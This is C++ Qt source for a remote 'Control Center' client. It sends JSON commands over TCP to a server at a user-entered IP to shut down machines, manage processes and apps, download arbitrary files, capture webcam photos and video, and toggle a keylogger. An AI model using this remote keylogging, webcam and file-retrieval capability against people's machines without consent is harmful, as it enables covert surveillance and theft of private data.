#include "CustomMode.h"
#include "CustomMode_ui.h"
#include "Download_file.h"
#include "Capture_photo.h"
#include "Record_video.h"

CustomMode::CustomMode(QWidget *parent) : QMainWindow(parent)
{
    programUI = new CustomModeUI(this);
    if (!programUI)
    {
        qDebug() << "Failed to create CustomModeUI!";
        return;
    }

    setCentralWidget(programUI);
    this->resize(950, 600);
    this->setMinimumSize(950, 600);
    this->setWindowTitle("Custom Mode - Control Center");

    connect(programUI->btnSystem, &QPushButton::clicked, this, &CustomMode::showSystemPage);
    connect(programUI->btnProcesses, &QPushButton::clicked, this, &CustomMode::showProcessesPage);
    connect(programUI->btnApps, &QPushButton::clicked, this, &CustomMode::showAppsPage);
    connect(programUI->btnFiles, &QPushButton::clicked, this, &CustomMode::showFilesPage);
    connect(programUI->btnWebcam, &QPushButton::clicked, this, &CustomMode::showWebcamPage);
    connect(programUI->btnKeylogger, &QPushButton::clicked, this, &CustomMode::showKeyloggerPage);

    connect(programUI->btnShutdown, &QPushButton::clicked, [=]()
            { sendCommand(programUI, "shutdown"); });
    connect(programUI->btnRestart, &QPushButton::clicked, [=]()
            { sendCommand(programUI, "restart"); });

    connect(programUI->btnListProcesses, &QPushButton::clicked, [=]()
            { sendCommand(programUI, "list_process"); });

    connect(programUI->btnStartProcess, &QPushButton::clicked, [=]()
            {
        bool ok;
        QString cmd = QInputDialog::getText(this, "Start Process", "Command:", QLineEdit::Normal, "", &ok);
        if (ok && !cmd.isEmpty())
            sendCommand(programUI, "start_process", cmd); });

    connect(programUI->btnStopProcess, &QPushButton::clicked, [=]()
            {
        QList<QTableWidgetItem *> selected = programUI->tableProcesses->selectedItems();
        if (!selected.isEmpty())
            sendCommand(programUI, "stop_process", selected.first()->text()); });

    connect(programUI->btnListApps, &QPushButton::clicked, [=]()
            {
        QString ip = programUI->lineEditServerIP->text().trimmed();
        QTextEdit *log = programUI->textEditAppLog;

        if (ip.isEmpty()) {
            programUI->lineEditServerIP->setStyleSheet("border: 2px solid red;");
            log->append("❌ Missing server IP.");
            return;
        } else {
            programUI->lineEditServerIP->setStyleSheet("");
        }

        sendCommand(programUI, "list_apps"); });

    connect(programUI->btnStartAppOnly, &QPushButton::clicked, [=]()
            {
        QString ip = programUI->lineEditServerIP->text().trimmed();
        QString name = programUI->lineEditStartAppName->text().trimmed();
        QTextEdit *log = programUI->textEditAppLog;

        bool hasError = false;
        if (ip.isEmpty()) {
            programUI->lineEditServerIP->setStyleSheet("border: 2px solid red;");
            log->append("❌ Missing server IP.");
            hasError = true;
        } else {
            programUI->lineEditServerIP->setStyleSheet("");
        }

        if (name.isEmpty()) {
            programUI->lineEditStartAppName->setStyleSheet("border: 2px solid red;");
            log->append("❌ Missing application name.");
            hasError = true;
        } else {
            programUI->lineEditStartAppName->setStyleSheet("");
        }

        if (!hasError)
            sendCommand(programUI, "start_app", name); });

    connect(programUI->btnStopAppOnly, &QPushButton::clicked, [=]()
            {
        QString ip = programUI->lineEditServerIP->text().trimmed();
        QString name = programUI->lineEditStopAppName->text().trimmed();
        QTextEdit *log = programUI->textEditAppLog;

        bool hasError = false;
        if (ip.isEmpty()) {
            programUI->lineEditServerIP->setStyleSheet("border: 2px solid red;");
            log->append("❌ Missing server IP.");
            hasError = true;
        } else {
            programUI->lineEditServerIP->setStyleSheet("");
        }

        if (name.isEmpty()) {
            programUI->lineEditStopAppName->setStyleSheet("border: 2px solid red;");
            log->append("❌ Missing application name.");
            hasError = true;
        } else {
            programUI->lineEditStopAppName->setStyleSheet("");
        }

        if (!hasError)
            sendCommand(programUI, "stop_app", name); });

    connect(programUI->btnCapturePhoto, &QPushButton::clicked, [=]()
            {
        QString ip = programUI->lineEditServerIP->text().trimmed();
        if (ip.isEmpty()) {
            showErrorLine(programUI->lineEditServerIP, "Please enter server IP.");
            return;
        }

        QProgressDialog *progress = new QProgressDialog("Receiving photo...", QString(), 0, 0, this);
        progress->setWindowTitle("Capture Photo");
        progress->setCancelButton(nullptr);
        progress->show();

        CapturePhotoThread *thread = new CapturePhotoThread(ip, progress);
        connect(thread, &CapturePhotoThread::finished, this, [=](const QString &p) {
            progress->close();
            QMessageBox::information(this, "Photo Saved", "✅ Saved to:\n" + p);
        });
        connect(thread, &CapturePhotoThread::error, this, [=](const QString &msg) {
            progress->close();
            QMessageBox::critical(this, "Error", "❌ " + msg);
        });
        thread->start(); });

    connect(programUI->btnRecordVideo, &QPushButton::clicked, [=]()
            {
        QString ip = programUI->lineEditServerIP->text().trimmed();
        if (ip.isEmpty()) {
            showErrorLine(programUI->lineEditServerIP, "Please enter server IP.");
            return;
        }

        int sec = programUI->spinBoxRecordSec->value();
        QProgressDialog *progress = new QProgressDialog("Receiving video...", QString(), 0, 0, this);
        progress->setWindowTitle("Record Video");
        progress->setCancelButton(nullptr);
        progress->show();

        RecordVideoThread *thread = new RecordVideoThread(ip, sec, progress);
        connect(thread, &RecordVideoThread::finished, this, [=](const QString &p) {
            progress->close();
            QMessageBox::information(this, "Video Saved", "✅ Saved to:\n" + p);
        });
        connect(thread, &RecordVideoThread::error, this, [=](const QString &msg) {
            progress->close();
            QMessageBox::critical(this, "Error", "❌ " + msg);
        });
        thread->start(); });

    static bool logging = false;
    connect(programUI->btnKeyLogger, &QPushButton::clicked, [=]() mutable
            {
        if (!logging) {
            sendCommand(programUI, "start_keylogger");
            programUI->btnKeyLogger->setText("🛑 Stop Keylogger");
        } else {
            sendCommand(programUI, "stop_keylogger");
            programUI->btnKeyLogger->setText("🟢 Start Keylogger");
        }
        logging = !logging; });

    connect(programUI->btnGetFile, &QPushButton::clicked, [=]()
            {
        QString path = programUI->lineEditFilePath->text().trimmed();
        QString ip = programUI->lineEditServerIP->text().trimmed();

        if (path.isEmpty()) {
            showErrorLine(programUI->lineEditFilePath, "Please enter a file path.");
            return;
        }

        if (ip.isEmpty()) {
            showErrorLine(programUI->lineEditServerIP, "Please enter server IP.");
            return;
        }

        QString downloads = QStandardPaths::writableLocation(QStandardPaths::DownloadLocation);
        QString filename = QFileInfo(path).fileName();
        QString savePath = downloads + "/" + filename;

        QProgressDialog *progress = new QProgressDialog("Downloading...", QString(), 0, 100, this);
        progress->setWindowTitle("Download File");
        progress->setCancelButton(nullptr);
        progress->setValue(0);
        progress->show();

        FileDownloaderThread *thread = new FileDownloaderThread(ip, path, savePath, progress);
        connect(thread, &FileDownloaderThread::finished, this, [=](const QString &p) {
            progress->close();
            QMessageBox::information(this, "Success", "✅ File saved to:\n" + p);
        });
        connect(thread, &FileDownloaderThread::error, this, [=](const QString &msg) {
            progress->close();
            QMessageBox::critical(this, "Error", "❌ " + msg);
        });
        thread->start(); });

    this->show();
}

void CustomMode::showErrorLine(QLineEdit *line, const QString &message)
{
    QMessageBox::warning(this, "Missing Field", message);
    line->setStyleSheet("border: 2px solid red;");
}

void CustomMode::appendOutput(QTextEdit *output, const QString &text)
{
    QString currentText = output->toPlainText();
    output->setPlainText(text + "\n" + currentText);

    QTextCursor cursor = output->textCursor();
    cursor.movePosition(QTextCursor::Start);
    output->setTextCursor(cursor);
}

void CustomMode::sendCommand(CustomModeUI *ui, const QString &cmd, const QString &arg)
{
    QString ip = ui->lineEditServerIP->text().trimmed();
    if (ip.isEmpty())
    {
        showErrorLine(ui->lineEditServerIP, "Please enter a valid server IP address.");
        return;
    }

    QTcpSocket socket;
    socket.connectToHost(ip, 12345);
    if (!socket.waitForConnected(2000))
    {
        appendOutput(ui->textOutputSystem, "❌ Cannot connect to server.");
        return;
    }

    QJsonObject obj;
    obj["command"] = cmd;
    if (!arg.isEmpty())
        obj["value"] = arg;

    QJsonDocument doc(obj);
    socket.write(doc.toJson(QJsonDocument::Compact) + "\n");
    socket.flush();

    if (!socket.waitForReadyRead(3000))
    {
        appendOutput(ui->textOutputSystem, "❌ Server timeout.");
        return;
    }

    QByteArray response = socket.readAll();

    if (cmd == "list_process")
    {
        response = response.trimmed();

        QJsonDocument jsonDoc = QJsonDocument::fromJson(response);
        if (!jsonDoc.isObject())
        {
            QMessageBox::warning(this, "Error", "Invalid JSON from server.");
            return;
        }

        QJsonObject obj = jsonDoc.object();
        if (obj.contains("error"))
        {
            QMessageBox::warning(this, "Error", obj["error"].toString());
            return;
        }

        QJsonArray processes = obj["processes"].toArray();
        ui->tableProcesses->clearContents();
        ui->tableProcesses->setColumnCount(3);
        ui->tableProcesses->setRowCount(processes.size());
        ui->tableProcesses->setHorizontalHeaderLabels({"PID", "Name", "User"});

        for (int i = 0; i < processes.size(); ++i)
        {
            QJsonObject proc = processes[i].toObject();
            ui->tableProcesses->setItem(i, 0, new QTableWidgetItem(proc["pid"].toString()));
            ui->tableProcesses->setItem(i, 1, new QTableWidgetItem(proc["name"].toString()));
            ui->tableProcesses->setItem(i, 2, new QTableWidgetItem(proc["user"].toString()));
        }
        return;
    }

    QTextEdit *output = nullptr;
    switch (ui->stackedWidget->currentIndex())
    {
    case 0:
        output = ui->textOutputSystem;
        break;
    case 1:
        output = ui->textOutputProcess;
        break;
    case 2:
        output = ui->textEditAppLog;
        break;
    case 3:
        output = ui->textOutputFiles;
        break;
    case 4:
        output = ui->textOutputWebcam;
        break;
    case 5:
        output = ui->textOutputKeylogger;
        break;
    }

    if (output)
        appendOutput(output, QString::fromUtf8(response));
}

void CustomMode::showSystemPage() { programUI->stackedWidget->setCurrentIndex(0); }
void CustomMode::showProcessesPage() { programUI->stackedWidget->setCurrentIndex(1); }
void CustomMode::showAppsPage() { programUI->stackedWidget->setCurrentIndex(2); }
void CustomMode::showFilesPage() { programUI->stackedWidget->setCurrentIndex(3); }
void CustomMode::showWebcamPage() { programUI->stackedWidget->setCurrentIndex(4); }
void CustomMode::showKeyloggerPage() { programUI->stackedWidget->setCurrentIndex(5); }

CustomMode::~CustomMode()
{
    delete programUI;
}
